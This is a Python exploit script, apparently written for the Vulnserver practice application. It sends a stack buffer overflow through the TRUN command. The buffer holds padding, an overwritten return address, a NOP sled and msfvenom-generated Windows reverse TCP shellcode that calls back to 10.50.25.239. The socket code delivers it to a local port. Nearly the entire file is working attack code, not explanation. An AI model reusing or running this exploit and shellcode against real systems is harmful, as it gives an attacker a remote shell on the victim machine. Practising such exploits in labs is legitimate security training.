#!/usr/bin/python

import socket


buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xad\x12\x50\x62"
buf += "\x90" * 10
'''
625012AD
625012BA
'''
#msfvenom -p windows/shell/reverse_tcp lhost =10.50.25.239 -b "\x00" -f python

buf += b""
buf += b"\xda\xd5\xd9\x74\x24\xf4\xbb\xdf\x88\xd4\x8f\x5d"
buf += b"\x31\xc9\xb1\x59\x31\x5d\x19\x83\xed\xfc\x03\x5d"
buf += b"\x15\x3d\x7d\x28\x67\x4e\x7e\xd1\x78\x30\x4e\x03"
buf += b"\x1c\x3b\xe2\x93\x56\x69\x0f\x5d\x8d\x06\x5d\x49"
buf += b"\x7f\xe7\xe9\x03\x57\x18\x59\xa9\x81\x17\x65\x82"
buf += b"\xf2\x36\x19\xd9\x26\x98\x20\x12\x3b\xd9\x65\xe4"
buf += b"\x31\x36\x3b\xa0\x32\x9a\xac\xc5\x07\x26\xcc\x09"
buf += b"\x0c\x16\xb6\x2c\xd3\xe2\x0a\x2e\x04\x81\xdb\x28"
buf += b"\x2f\xcd\xfb\x49\xfc\xbd\x7e\x80\x76\x01\xc8\x22"
buf += b"\x88\xf2\xfe\xcf\x77\xd2\xce\x0f\xdb\x1b\xff\x9d"
buf += b"\x25\x5c\x38\x7e\x50\x96\x3a\x03\x63\x6d\x40\xdf"
buf += b"\xe6\x71\xe2\x94\x51\x55\x12\x78\x07\x1e\x18\x35"
buf += b"\x43\x78\x3d\xc8\x80\xf3\x39\x41\x27\xd3\xcb\x11"
buf += b"\x0c\xf7\x90\xc2\x2d\xae\x7c\xa4\x52\xb0\xd9\x19"
buf += b"\xf7\xbb\xc8\x4c\x87\x44\x13\x71\xd5\xd2\xdf\xbc"
buf += b"\xe6\x22\x48\xb6\x95\x10\xd7\x6c\x32\x18\x90\xaa"
buf += b"\xc5\x29\xb6\x4c\x19\x91\xd7\xb2\x9a\xe1\xfe\x70"
buf += b"\xce\xb1\x68\x50\x6f\x5a\x69\x5d\xba\xf6\x63\xc9"
buf += b"\x4f\x34\x6d\xe6\x38\x3a\x8d\xed\x0b\xb3\x6b\x5d"
buf += b"\x3c\x93\x23\x1e\xec\x53\x94\xf6\xe6\x5c\xcb\xe7"
buf += b"\x08\xb7\x64\x8d\xe6\x61\xdc\x3a\x9e\x28\x96\xdb"
buf += b"\x5f\xe7\xd2\xdc\xd4\x0d\x22\x92\x1c\x64\x30\xc3"
buf += b"\x7a\x86\xc8\x14\xef\x86\xa2\x10\xb9\xd1\x5a\x1b"
buf += b"\x9c\x15\xc5\xe4\xcb\x26\x02\x1a\x8a\x1e\x78\x2d"
buf += b"\x18\x1e\x16\x52\xcc\x9e\xe6\x04\x86\x9e\x8e\xf0"
buf += b"\xf2\xcd\xab\xfe\x2e\x62\x60\x6b\xd1\xd2\xd4\x3c"
buf += b"\xb9\xd8\x03\x0a\x66\x23\x66\x08\x61\xdb\xf4\x27"
buf += b"\xca\xb3\x06\x78\xea\x43\x6d\x78\xba\x2b\x7a\x57"
buf += b"\x35\x9b\x83\x72\x1e\xb3\x0e\x13\xec\x22\x0e\x3e"
buf += b"\xb0\xfa\x0f\xcd\x69\x0d\x75\xbe\x8e\xee\x8a\xd6"
buf += b"\xea\xef\x8a\xd6\x0c\xcc\x5c\xef\x7a\x13\x5d\x54"
buf += b"\x74\x26\xc0\xfd\x1f\x48\x56\xfd\x35"




s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #IPV4

ipaddr = '127.0.0.1'
port = 11920
s.connect((ipaddr, port)) #ip port to connect to 

print s.recv(1024) #prints response
s.send(buf)  # send buf
print s.recv(1024) #print response
s.close()


